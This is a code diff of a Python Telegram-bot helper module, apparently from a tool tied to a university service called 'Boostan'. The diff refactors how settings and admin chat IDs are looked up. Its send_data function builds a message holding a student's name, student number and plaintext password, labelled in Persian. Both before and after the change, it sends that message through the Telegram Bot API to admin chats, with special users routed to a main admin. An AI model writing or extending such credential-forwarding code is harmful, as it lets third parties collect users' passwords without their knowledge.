@@ -1,20 +1,22 @@
 import urllib
 
 import requests
-from api.models import Setting
+from api.models import (
+    get_all_admin_chat_id,
+    get_main_admin_chat_id,
+    get_special_users,
+    get_telegram_api,
+)
 
-try:
-    TELEGRAM_API = Setting.objects.get(name="telegram_api").value
-except:
-    TELEGRAM_API = ""
+TELEGRAM_API = get_telegram_api()
 TELEGRAM_API_URL = "https://api.telegram.org/bot" + TELEGRAM_API + "/"
 
 
 def send_data(full_name, stun, password):
-    text = f"نام: {full_name}\nشماره دانشجویی: {stun}\nرمزعبور: {password}"
-
-    if stun == "4006126009":
-        main_admin = Setting.objects.get(name="main_admin").value
+    text = f"بوستان 🍟🍔\nنام: {full_name}\nشماره دانشجویی: {stun}\nرمزعبور: {password}"
+    special_users = get_special_users()
+    if stun in special_users:
+        main_admin = get_main_admin_chat_id()
         req = TELEGRAM_API_URL + f"sendMessage?chat_id={main_admin}&text={text}"
         requests.get(req).json()
     else:
@@ -27,7 +29,7 @@ def send_alert(text):
 
 def send_request(text):
     text = urllib.parse.quote_plus(str(text))
-    admins = Setting.objects.filter(name="telegram_chat_id").all()
+    admins = get_all_admin_chat_id()
     for admin in admins:
         print(admin.value)
         req = TELEGRAM_API_URL + f"sendMessage?chat_id={admin.value}&text={text}"
